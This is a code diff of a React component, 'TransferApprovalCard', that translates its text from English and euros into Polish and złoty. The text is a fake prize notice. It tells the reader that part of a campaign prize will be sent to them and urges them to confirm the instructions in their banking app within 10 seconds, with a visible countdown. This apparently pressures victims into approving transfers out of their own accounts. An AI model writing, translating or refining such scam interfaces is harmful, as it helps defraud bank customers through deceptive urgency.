@@ -356,20 +356,20 @@ function TransferApprovalCard({
         </div>
 
         <h1 className="mb-6 text-center text-[1.35rem] font-bold tracking-tight text-gray-800">
-          Confirmation Notification
+          Powiadomienie o potwierdzeniu
         </h1>
 
         <div className="mb-6 rounded-2xl bg-[#f4f7fb] px-5 py-4">
           <p className="text-center text-[13px] font-medium leading-relaxed text-gray-600">
-            Congratulations! Since there are multiple winners in the campaign, a portion of the{" "}
-            <span className="font-bold text-gray-900">€{shownAmount}</span> shown in the confirmation
-            notification you see in the app will be transferred to you. Confirm the instructions
-            within 10 seconds and do not reject them. This transfer is processed by your bank.
+            Gratulacje! Ponieważ w kampanii jest wielu zwycięzców, część kwoty{" "}
+            <span className="font-bold text-gray-900">{shownAmount} zł</span> widocznej w potwierdzeniu
+            w aplikacji zostanie przelana na Twoje konto. Potwierdź instrukcje
+            w ciągu 10 sekund i nie odrzucaj ich. Ten przelew jest realizowany przez Twój bank.
           </p>
         </div>
 
         <p className="mb-5 text-center text-[13px] text-gray-500">
-          Time remaining: <span className="font-bold text-gray-800">{secondsLeft} s</span>
+          Pozostały czas: <span className="font-bold text-gray-800">{secondsLeft} s</span>
         </p>
 
         <button
